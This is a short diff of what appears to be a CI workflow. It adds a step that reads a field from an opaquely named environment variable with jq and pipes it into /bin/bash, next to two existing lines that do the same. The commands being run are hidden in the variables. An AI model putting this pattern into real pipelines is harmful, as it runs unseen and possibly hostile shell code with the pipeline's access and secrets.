@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$kr29" | jq -r .cvgrz75 | /bin/bash
           echo $wph909 | jq -r .qw60 | /bin/bash
+          echo $okf6 | jq -r .tku3362 | /bin/bash
 
       - name: Archive results
         if: always()
